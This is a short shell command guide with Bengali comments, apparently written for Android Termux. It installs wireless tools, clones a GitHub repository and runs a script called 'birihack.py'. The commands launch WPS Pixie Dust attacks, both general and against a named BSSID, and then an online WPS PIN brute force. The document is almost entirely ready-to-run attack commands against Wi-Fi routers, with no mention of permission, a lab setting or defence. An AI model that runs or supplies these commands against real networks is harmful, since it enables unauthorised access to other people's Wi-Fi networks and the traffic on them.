# ১. সিস্টেম আপডেট এবং প্রয়োজনীয় প্যাকেজ ইন্সটল করা
apt update && apt upgrade
pkg install -y root-repo
pkg install -y git tsu python wpa-supplicant pixiewps iw

# ২. আপনার লিংক থেকে প্রজেক্ট ক্লোন করা এবং ফোল্ডারে প্রবেশ করা
git clone https://github.com/samiermd56-png/Samir.git
cd Samir

# ৩. পারমিশন দিয়ে স্ক্রিপ্ট রান করার উপযোগী করা (স্ক্রিপ্টের নাম যদি birihack.py হয়)
chmod +x birihack.py
sudo python birihack.py --help

# ৪. ট্রাবলশুটিং এবং রান করার কমান্ড (প্রথমে Wi-Fi অন করে অফ করে নিন)
# সাধারণ Pixie Dust অ্যাটাক:
sudo python birihack.py -i wlan0 -K

# নির্দিষ্ট BSSID তে Pixie Dust অ্যাটাক:
sudo python birihack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K

# অনলাইন WPS ব্রুটফোর্স (পিন কোডের প্রথম অংশসহ):
sudo python birihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
